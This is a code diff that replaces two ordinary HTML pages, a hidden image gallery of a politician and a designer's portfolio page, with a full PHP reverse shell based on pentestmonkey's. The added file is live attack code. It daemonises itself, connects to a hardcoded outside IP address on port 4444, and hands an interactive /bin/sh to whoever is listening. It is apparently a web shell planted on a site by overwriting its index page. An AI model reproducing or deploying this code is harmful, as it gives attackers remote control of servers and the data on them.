@@ -1,117 +1,150 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Rizki Sadig</title>
-    <style>
-      .meet {
-        position: absolute;
-        z-index: -99999;
-      }
-      .meet img {
-        position: absolute;
-        z-index: -999999999999999;
-        width: 100px;
-        height: 100px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="meet">
-      <img src="https://rmol.id/images/berita/normal/2022/04/92027_07362817042022_rizki_sadig.jpg" alt="Rizki Sadig" />
-      <img src="https://1.bp.blogspot.com/-T5mk1coNBS4/YGckpZEMhuI/AAAAAAAADKM/qKmLQaB51gsHxSFOHIMj0_RpUGJTZlInQCLcBGAsYHQ/s2048/DSC01354.JPG" alt="Rizki Sadig" />
-      <img src="https://cdn-2.tstatic.net/surabaya/foto/bank/images/ketua-dpw-pan-jawa-timur-ahmad-rizki-sadig-saat-memompa-semangat-kader.jpg" alt="Rizki Sadig" />
-      <img src="https://kataindonesia.com/wp-content/uploads/2021/08/Screenshot_20210824-180213_Word-750x512.jpg" alt="Rizki Sadig" />
-      <img src="https://cdn-2.tstatic.net/suryamalang/foto/bank/images/ketua-dpw-pan-jatim-a-rizki-sadig.jpg" alt="Rizki Sadig" />
-      <img src="https://amanat.news/wp-content/uploads/2022/06/IMG_20220610_184224.jpg" alt="Rizki Sadig" />
-      <img src="https://foto.wartaekonomi.co.id/files/arsip_foto_2021_08_28/kementerian_komunikasi_dan_informatika_123347_small.jpg" alt="Rizki Sadig" />
-      <img src="https://lintasjatim.com/wp-content/uploads/2021/12/IMG-20211210-WA0006.jpg" alt="Rizki Sadig" />
-      <img src="https://pbs.twimg.com/profile_images/727658699683078144/IbRoyLZB_400x400.jpg" alt="Rizki Sadig" />
-    </div>
-  </body>
-</html>
-<!DOCTYPE html>
-<html class="full">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-  <meta name="apple-mobile-web-app-capable" content="no">
-  <title> Ivelin Mitev | UI, UX, Product Designer and Front-end Developer</title>
-  <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
-  <link rel="stylesheet" type="text/css" href="css/animate.min.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.css">
-  <link rel="stylesheet" href="http://code.ionicframework.com/ionicons/1.5.2/css/ionicons.min.css">
-  <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap-glyphicons.css" rel="stylesheet">
-  <link rel="stylesheet" type="text/css" href="css/app.css">
-  <script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+<?php
 
-  ga('create', 'UA-66654794-1', 'auto');
-  ga('send', 'pageview');
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
-  </script>
-</head>
-<body>
-<!-- Google Tag Manager -->
-<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-M57SHV"
-height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-})(window,document,'script','dataLayer','GTM-M57SHV');</script>
-<!-- End Google Tag Manager -->
-  <div ng-app="myApp" ng-controller="PageController">
-     <nav class="navbar navbar-inverse navbar-fixed-top">
-      <div class="container">
-        <div class="navbar-header">
-          <button type="button" class="navbar-toggle  collapsed fa fa-bars" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
-          </button>
-          <a class="navbar-brand animated slideInLeft wow" data-wow-duration="1s" href="/home">Ivelin Mitev.</a>
-        </div>
-        <div id="navbar" class="collapse navbar-collapse animated slideInRight wow" data-wow-duration="1s">
-          <ul class="nav navbar-nav navbar-right">
-            <li><a href="/home">Home</a></li>
-            <li><a href="/about">Read Bio</a></li>
-            <!--<li><a href="/portfolio">Work</a></li>-->
-            <li><a href="/contacts">Contact me</a></li>
-            <button class="button button-mat btn-1" onclick="window.location.href='./images/Ivelin-Mitev-CV-EN.pdf'"> <div class="psuedo-text"> Download CV</div> </button>
-          </ul>
-        </div>
-      </div>
-    </nav>
-    <div class="container" ng-view>
-      
-    </div>
-  </div>
-      <script type="text/javascript" src="lib/jquery.js"></script>
-      <script type="text/javascript" src="lib/angular.js"></script>
-      <script type="text/javascript" src="lib/bootstrap.min.js"></script>
-      <script type="text/javascript" src="lib/angular-resource.js"></script>
-      <script type="text/javascript" src="lib/angular-route.js"></script>
-      <script type="text/javascript" src="lib/angular-animate.js"></script>
-      <script type="text/javascript" src="js/wow.js"></script>
-      <script type="text/javascript" src="js/app.js"></script>
-      <script type="text/javascript" src="js/controllers/PageController.js"></script>
-      <script type="text/javascript" src="js/controllers/HomeController.js"></script>
-      <script type="text/javascript" src="js/controllers/AboutController.js"></script>
-      <script type="text/javascript" src="js/controllers/ServicesController.js"></script>
-      <script type="text/javascript" src="js/controllers/ContactsController.js"></script>
-      <script src="http://angular-ui.github.com/bootstrap/ui-bootstrap-tpls-0.2.0.js"></script>
-      <script type="text/javascript">
-      $(document).ready(function(){
-        $("ul li").on("click",function(){
-          if($(window).width() <= 768) {
-            $(".navbar-toggle").trigger("click");
-          }
-         
-        });
-      });
-      </script>
-</body>
-</html>
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '51.222.42.163';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+
+
